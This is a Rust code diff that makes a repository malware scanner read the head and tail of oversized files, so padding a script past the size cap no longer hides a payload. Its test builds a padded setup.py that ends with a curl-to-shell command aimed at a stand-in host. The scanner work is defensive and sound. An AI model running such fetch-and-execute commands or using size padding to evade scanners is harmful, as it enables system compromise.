@@ -490,9 +490,80 @@ const DEFAULT_EXCLUDED_DIRS: &[&str] = &[
     ".pytest_cache",
 ];
 
-/// Files larger than this are skipped for content scanning (still visible to
-/// the Provenance phase, which flags oversized files).
+/// Files larger than this are not read whole for content scanning. They are
+/// not skipped either: see [`oversized_excerpt`].
 const MAX_CONTENT_SCAN_BYTES: u64 = 10_000_000;
+
+/// How much of each end of an oversized file is still scanned. Padding a
+/// script past a scanner's size cap is a cheap evasion — the evaluation set
+/// has a 22 MB `setup.py` that writes an executable from one enormous bytes
+/// literal and runs it on the line after — and the payload sits at one end
+/// or the other of the padding, never inside it.
+const OVERSIZED_EXCERPT_BYTES: usize = 2_000_000;
+
+/// Past this even the excerpt is skipped; the Provenance phase still sees the
+/// file's size.
+const OVERSIZED_MAX_BYTES: u64 = 512_000_000;
+
+/// The scanned parts of an oversized file.
+struct OversizedExcerpt {
+    head: String,
+    tail: String,
+    /// Newlines before the tail starts: tail line `i` (1-based) is file
+    /// line `tail_line_offset + i`.
+    tail_line_offset: usize,
+}
+
+/// Read the first and last [`OVERSIZED_EXCERPT_BYTES`] of a text file and
+/// count the newlines in between, so tail findings carry real line numbers.
+/// Returns `None` for binary content or a file past [`OVERSIZED_MAX_BYTES`].
+fn oversized_excerpt(path: &Path, len: u64) -> Option<OversizedExcerpt> {
+    use std::io::{Read, Seek, SeekFrom};
+    if len > OVERSIZED_MAX_BYTES {
+        return None;
+    }
+    let mut file = std::fs::File::open(path).ok()?;
+    let mut head = vec![0u8; OVERSIZED_EXCERPT_BYTES];
+    let mut filled = 0;
+    while filled < head.len() {
+        match file.read(&mut head[filled..]) {
+            Ok(0) => break,
+            Ok(n) => filled += n,
+            Err(_) => return None,
+        }
+    }
+    head.truncate(filled);
+    if head.contains(&0) {
+        return None;
+    }
+    let excerpt = OVERSIZED_EXCERPT_BYTES as u64;
+    let tail_start = len.saturating_sub(excerpt).max(excerpt);
+    let mut newlines = head.iter().filter(|b| **b == b'\n').count();
+    let mut pos = excerpt;
+    let mut buf = vec![0u8; 1 << 20];
+    while pos < tail_start {
+        let want = ((tail_start - pos) as usize).min(buf.len());
+        match file.read(&mut buf[..want]) {
+            Ok(0) => break,
+            Ok(n) => {
+                newlines += buf[..n].iter().filter(|b| **b == b'\n').count();
+                pos += n as u64;
+            }
+            Err(_) => return None,
+        }
+    }
+    file.seek(SeekFrom::Start(tail_start)).ok()?;
+    let mut tail = Vec::new();
+    file.read_to_end(&mut tail).ok()?;
+    if tail.contains(&0) {
+        tail.clear();
+    }
+    Some(OversizedExcerpt {
+        head: String::from_utf8_lossy(&head).into_owned(),
+        tail: String::from_utf8_lossy(&tail).into_owned(),
+        tail_line_offset: newlines,
+    })
+}
 
 /// Collect candidate files honoring `.gitignore` (only inside real git repos —
 /// `require_git(true)` — so a malicious `.gitignore` inside an extracted
@@ -590,15 +661,22 @@ pub fn run_scan(
         .par_iter()
         .map(|file_path| {
             let none: FileOutcome = (Vec::new(), Vec::new());
-            let contents = match std::fs::metadata(file_path) {
-                Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => return none,
+            // An oversized file yields its head as `contents` and its tail
+            // separately; a normal file yields its whole text and no tail.
+            let (contents, tail) = match std::fs::metadata(file_path) {
+                Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => {
+                    match oversized_excerpt(file_path, meta.len()) {
+                        Some(ex) => (ex.head, Some((ex.tail, ex.tail_line_offset))),
+                        None => return none,
+                    }
+                }
                 Ok(_) => match std::fs::read(file_path) {
                     Ok(bytes) => {
                         // Skip binary files (contains null bytes) and use lossy UTF-8
                         if bytes.contains(&0) {
                             return none;
                         }
-                        String::from_utf8_lossy(&bytes).into_owned()
+                        (String::from_utf8_lossy(&bytes).into_owned(), None)
                     }
                     Err(_) => return none,
                 },
@@ -664,6 +742,20 @@ pub fn run_scan(
                 for derived in derive::derive_units(&unit.contents, unit.depth, &mut budget) {
                     queue.push(derived);
                 }
+            }
+
+            // The tail of an oversized file is scanned once, without the
+            // decode worklist, and its findings are re-numbered onto the
+            // real lines of the file.
+            if let Some((tail_text, offset)) = tail {
+                let tail_norm = normalize::normalize_for_matching(&tail_text);
+                let tail_findings =
+                    run_phases(&rel_path, &tail_norm, &should_run_phase, &cloud_sigs);
+                file_findings.extend(tail_findings.into_iter().map(|mut f| {
+                    f.line = f.line.map(|l| l + offset);
+                    f.snippet = format!("[tail of oversized file] {}", f.snippet);
+                    f
+                }));
             }
 
             // A marker on the line that carried an encoded blob also covers
@@ -872,6 +964,48 @@ mod phase_registry_tests {
         let before = names.len();
         names.dedup();
         assert_eq!(before, names.len(), "duplicate canonical phase name");
+    }
+}
+
+#[cfg(test)]
+mod oversized_tests {
+    use super::*;
+    use std::io::Write;
+
+    /// A 10 MB+ setup.py with the payload after one enormous literal: the
+    /// old behaviour skipped the file entirely, so the payload was never
+    /// seen and only PROV-004 (Low) fired.
+    #[test]
+    fn oversized_script_head_and_tail_are_scanned_with_real_line_numbers() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("setup.py");
+        let mut f = std::fs::File::create(&path).unwrap();
+        f.write_all(b"import os\n").unwrap();
+        f.write_all(b"blob = b'").unwrap();
+        let chunk = vec![b'A'; 1 << 20];
+        for _ in 0..11 {
+            f.write_all(&chunk).unwrap();
+        }
+        f.write_all(b"'\n").unwrap();
+        f.write_all(b"os.system('curl http://x.example/a.sh | sh')\n")
+            .unwrap();
+        f.write_all(b"setup(name='x')\n").unwrap();
+        drop(f);
+        assert!(std::fs::metadata(&path).unwrap().len() > MAX_CONTENT_SCAN_BYTES);
+
+        let result = run_scan(dir.path(), None, None);
+        let tail_hit = result
+            .findings
+            .iter()
+            .find(|f| f.rule == "CODE-014")
+            .expect("os.system in the tail must be found");
+        assert_eq!(tail_hit.line, Some(3), "{tail_hit:?}");
+        assert!(tail_hit.snippet.starts_with("[tail of oversized file] "));
+        assert!(
+            result.findings.iter().any(|f| f.rule == "PROV-007"),
+            "a megabyte setup.py is itself a finding: {:?}",
+            result.findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
     }
 }
 
